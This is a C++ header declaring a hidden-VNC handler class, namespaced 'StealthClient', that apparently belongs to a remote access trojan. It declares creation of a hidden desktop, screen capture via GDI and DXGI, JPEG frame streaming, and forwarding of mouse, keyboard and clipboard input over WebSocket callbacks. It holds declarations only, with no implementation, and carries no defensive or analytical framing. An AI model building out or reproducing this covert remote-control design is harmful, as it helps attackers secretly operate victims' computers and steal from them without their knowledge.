#pragma once
#include <windows.h>
#include <string>
#include <thread>
#include <atomic>
#include <memory>
#include <functional>
#include <queue>
#include <mutex>
#include <condition_variable>

namespace StealthClient {

struct HvncSettings {
    std::string quality = "medium";
    int fps = 15;
    std::string compression = "high";
};

struct FrameData {
    std::vector<uint8_t> data;
    int width;
    int height;
    size_t size;
};

class HvncHandler {
public:
    HvncHandler();
    ~HvncHandler();

    // Start HVNC session with hidden desktop
    bool Start(const std::string& sessionId, const HvncSettings& settings);
    
    // Stop HVNC session
    void Stop();
    
    // Check if session is active
    bool IsActive() const { return m_active; }
    
    // Get current session ID
    std::string GetSessionId() const { return m_sessionId; }
    
    // Handle input commands
    bool HandleCommand(const std::string& command, const std::string& params);
    
    // Set callback for frame data
    void SetFrameCallback(std::function<void(const FrameData&, const std::string&)> callback);
    
    // Set callback for sending WebSocket messages
    void SetSendMessageCallback(std::function<void(const std::string&)> callback);

private:
    // Hidden desktop management
    bool CreateHiddenDesktop();
    void DestroyHiddenDesktop();
    bool SwitchToHiddenDesktop();
    
    // Screen capture
    void CaptureThread();
    bool CaptureFrame(FrameData& frame);
    bool CaptureFrameGDI(FrameData& frame);
    bool CaptureFrameDXGI(FrameData& frame);
    
    // Frame encoding
    bool EncodeFrameJPEG(const FrameData& frame, std::vector<uint8_t>& encoded, int quality);
    
    // Input forwarding
    bool SendMouseInput(int x, int y, const std::string& action, const std::string& button, int deltaX = 0, int deltaY = 0);
    bool SendKeyboardInput(const std::string& action, const std::string& key, int keyCode, bool shift, bool ctrl, bool alt, bool meta);
    bool SendClipboardInput(const std::string& text);
    
    // Helper functions
    int GetQualityValue(const std::string& quality) const;
    void CalculateFrameRate();
    int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
    
private:
    std::atomic<bool> m_active;
    std::atomic<bool> m_captureRunning;
    std::string m_sessionId;
    HvncSettings m_settings;
    
    // Hidden desktop
    HDESK m_hiddenDesktop;
    HDESK m_originalDesktop;
    
    // Screen capture
    std::unique_ptr<std::thread> m_captureThread;
    std::mutex m_frameMutex;
    std::condition_variable m_frameCondition;
    
    // Frame encoding
    int m_jpegQuality;
    int m_targetFPS;
    int m_actualFPS;
    std::chrono::steady_clock::time_point m_lastFrameTime;
    
    // Callbacks
    std::function<void(const FrameData&, const std::string&)> m_frameCallback;
    std::function<void(const std::string&)> m_sendMessageCallback;
    
    // Screen info
    int m_screenWidth;
    int m_screenHeight;
    
    // Performance tracking
    size_t m_totalFrames;
    size_t m_droppedFrames;
};

} // namespace StealthClient
